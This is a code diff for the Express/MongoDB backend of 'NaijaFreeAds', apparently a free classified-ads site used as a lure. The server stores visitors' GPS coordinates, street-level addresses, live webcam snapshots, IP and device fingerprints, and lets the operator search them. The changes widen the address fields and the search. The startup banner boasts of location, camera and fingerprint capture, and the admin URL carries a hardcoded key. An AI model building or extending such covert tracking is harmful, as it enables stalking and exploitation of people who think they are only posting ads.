@@ -22,11 +22,11 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 200 });
 app.use('/api/', limiter);
 
-// IMPORTANT: Serve static files from BOTH 'public' folder AND root directory
+// Serve static files
+app.use(express.static(__dirname));
 app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.static(__dirname)); // Fallback to root
 
-// MongoDB Schema
+// MongoDB Schema with FULL location details
 const captureSchema = new mongoose.Schema({
     id: { type: Number, required: true, unique: true },
     type: { type: String, enum: ['ad_posted', 'permission_granted', 'camera_update'], required: true },
@@ -40,16 +40,26 @@ const captureSchema = new mongoose.Schema({
         phone: String
     },
     location: {
-        lat: Number, lng: Number, accuracy: Number,
-        street: String, city: String, state: String,
-        country: String, postcode: String, fullAddress: String
+        lat: Number,
+        lng: Number,
+        accuracy: Number,
+        street: String,
+        city: String,
+        state: String,
+        country: String,
+        postcode: String,
+        suburb: String,
+        district: String,
+        fullAddress: String
     },
     cameraImage: String,
-    cameraFullBase64: String,
-    hasCamera: Boolean,
     device: {
-        userAgent: String, platform: String, language: String,
-        screen: String, timezone: String, ip: String
+        userAgent: String,
+        platform: String,
+        language: String,
+        screen: String,
+        timezone: String,
+        ip: String
     },
     ip: String
 }, { timestamps: true });
@@ -62,8 +72,10 @@ app.post('/api/capture', async (req, res) => {
     try {
         const data = req.body;
         if (!data.id) data.id = Date.now();
+        
         const existing = await Capture.findOne({ id: data.id });
         if (existing) return res.json({ success: true, message: 'Already exists' });
+        
         const capture = new Capture(data);
         await capture.save();
         console.log(`✅ Saved: ${data.type} - ID: ${data.id}`);
@@ -78,16 +90,20 @@ app.get('/api/fetch', async (req, res) => {
     try {
         const { limit = 500, search } = req.query;
         let query = {};
+        
         if (search) {
             query = {
                 $or: [
                     { 'ad.title': { $regex: search, $options: 'i' } },
                     { 'ad.location': { $regex: search, $options: 'i' } },
                     { 'location.city': { $regex: search, $options: 'i' } },
-                    { 'location.state': { $regex: search, $options: 'i' } }
+                    { 'location.state': { $regex: search, $options: 'i' } },
+                    { 'location.street': { $regex: search, $options: 'i' } },
+                    { 'location.fullAddress': { $regex: search, $options: 'i' } }
                 ]
             };
         }
+        
         const records = await Capture.find(query).sort({ timestamp: -1 }).limit(parseInt(limit));
         res.json({ success: true, records, count: records.length });
     } catch (error) {
@@ -126,28 +142,22 @@ app.get('/api/stats', async (req, res) => {
     }
 });
 
-// Serve HTML files (check both locations)
+// Serve HTML files
 app.get('/', (req, res) => {
-    const rootPath = path.join(__dirname, 'index.html');
-    const publicPath = path.join(__dirname, 'public', 'index.html');
-    if (require('fs').existsSync(rootPath)) {
-        res.sendFile(rootPath);
-    } else if (require('fs').existsSync(publicPath)) {
-        res.sendFile(publicPath);
+    const filePath = path.join(__dirname, 'index.html');
+    if (require('fs').existsSync(filePath)) {
+        res.sendFile(filePath);
     } else {
-        res.status(404).send('Index.html not found. Please check your file structure.');
+        res.sendFile(path.join(__dirname, 'public', 'index.html'));
     }
 });
 
 app.get('/admin.html', (req, res) => {
-    const rootPath = path.join(__dirname, 'admin.html');
-    const publicPath = path.join(__dirname, 'public', 'admin.html');
-    if (require('fs').existsSync(rootPath)) {
-        res.sendFile(rootPath);
-    } else if (require('fs').existsSync(publicPath)) {
-        res.sendFile(publicPath);
+    const filePath = path.join(__dirname, 'admin.html');
+    if (require('fs').existsSync(filePath)) {
+        res.sendFile(filePath);
     } else {
-        res.status(404).send('Admin.html not found. Please check your file structure.');
+        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
     }
 });
 
@@ -156,16 +166,21 @@ async function startServer() {
     try {
         await mongoose.connect(MONGODB_URI);
         console.log('✅ MongoDB connected');
+        
         app.listen(PORT, '0.0.0.0', () => {
             console.log(`
-╔═══════════════════════════════════════════════════╗
-║     NaijaFreeAds Server Running                   ║
-╠═══════════════════════════════════════════════════╣
-║  Main Website:  https://naijafreeads.onrender.com ║
+╔═══════════════════════════════════════════════════════════════╗
+║     NaijaFreeAds Server Running - Professional Edition       ║
+╠═══════════════════════════════════════════════════════════════╣
+║  Main Website:  https://naijafreeads.onrender.com            ║
 ║  Admin Panel:   https://naijafreeads.onrender.com/admin.html?key=NAIJA2025DOPE ║
-║                                                   ║
-║  ⚠️  Keep your secret key safe!                   ║
-╚═══════════════════════════════════════════════════╝
+║                                                               ║
+║  📍 Location Capture: Street, City, State, Country, GPS      ║
+║  📸 Camera Capture: Live webcam snapshot                     ║
+║  💻 Device Info: Full device fingerprinting                  ║
+║                                                               ║
+║  ⚠️  Keep your secret key safe! Only YOU can access admin    ║
+╚═══════════════════════════════════════════════════════════════╝
             `);
         });
     } catch (error) {
